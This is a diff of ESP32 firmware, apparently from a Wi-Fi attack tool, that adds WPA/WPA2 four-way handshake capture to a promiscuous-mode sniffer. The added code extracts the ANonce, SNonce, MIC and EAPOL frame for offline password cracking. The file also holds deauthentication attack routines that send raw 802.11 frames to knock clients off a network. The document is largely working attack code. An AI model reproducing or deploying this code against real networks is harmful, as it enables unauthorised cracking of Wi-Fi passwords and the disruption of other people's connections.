@@ -2,18 +2,27 @@
 #include "esp_wifi.h"
 #include "esp_log.h"
 #include "esp_random.h"
+#include "utils.h"
 #include "wifi_attacks.h"
 
 #define CLIENT_SEM_WAIT 10
 #define TARGET_SEM_WAIT 10
 
-static const char *TAG = "WIFI_ATTACKS:";
+static const char *TAG = "WIFI_ATTACKS";
 
-static client_t clients[MAX_CLIENTS];
+static client_t clients[MAX_CLIENTS] = { 0 };
 static SemaphoreHandle_t clients_semaphore;
 static SemaphoreHandle_t target_semaphore;
 static uint8_t num_clients = 0;
 static target_info_t target = { 0 };
+static handshake_info_t handshake_info = { 0 };
+
+
+static bool isMacZero(uint8_t *mac)
+{
+    uint8_t zero_mac[6] = {0};
+    return memcmp(mac, zero_mac, 6) == 0;
+}
 
 
 static uint8_t get_target_info_copy(target_info_t *dest, target_info_t *src)
@@ -53,18 +62,43 @@ static void add_client_to_list(const uint8_t *mac)
 
 IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) 
 {   
-    if (type != WIFI_PKT_DATA) {
-        xSemaphoreGive(target_semaphore);
-        return;
-    }
     const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
-    const uint8_t *dest_mac = packet->payload + 4;  // Indirizzo di destinazione
-    const uint8_t *src_mac = packet->payload + 10;  // Indirizzo di sorgente
-    const uint8_t *bssid = packet->payload + 16;    // BSSID
+    uint16_t len = packet->rx_ctrl.sig_len;
 
-    if (memcmp(bssid, target.bssid, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0)
+    if (type == WIFI_PKT_DATA) 
     {
-        add_client_to_list(src_mac);
+        const uint8_t *dest_mac = packet->payload + 4;  // Destination Addr
+        const uint8_t *src_mac = packet->payload + 10;  // Source Addr
+        const uint8_t *bssid = packet->payload + 16;    // BSSID
+
+        if( len >= 100 && handshake_info.handshake_captured == false)
+        {
+            uint16_t key_info = (packet->payload[39]<<8) + packet->payload[40];
+            if (key_info == 0x008a && isMacZero(handshake_info.mac_sta)) 
+            {
+                /* Extract ANonce MSG 1 */
+                memcpy(handshake_info.anonce, packet->payload + 51, 32);
+                memcpy(handshake_info.mac_sta, dest_mac, 6);
+            } 
+            else if (key_info == 0x010a && !isMacZero(handshake_info.mac_sta) && memcmp(handshake_info.mac_sta, src_mac, 6) == 0) 
+            {
+                /* Extract SNonce and MIC from MSG 2 */
+                memcpy(handshake_info.snonce, packet->payload + 51, 32);
+                memcpy(handshake_info.mic, packet->payload + 115, 16);
+                /* Set MIC to zero */
+                memcpy(handshake_info.eapol, packet->payload + 34, len-34);
+                memset(&handshake_info.eapol[81], 0x00, 16);
+                /* -4 to remove frame check sequence byte */
+                handshake_info.eapol_len = len-4-34;
+                handshake_info.handshake_captured = true;
+                ESP_LOGI(TAG, "Got Handshake!");
+            }
+        }
+
+        if (memcmp(bssid, target.bssid, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0)
+        {
+            add_client_to_list(src_mac);
+        }
     }
     xSemaphoreGive(target_semaphore);
 }
@@ -532,4 +566,10 @@ void wifi_attack_deauth_client_negative_tx_power(void)
         esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, offset, false);
         vTaskDelay(pdMS_TO_TICKS(2));
     }
+}
+
+
+handshake_info_t * wifi_attack_engine_handshake(void)
+{
+    return &handshake_info;
 }
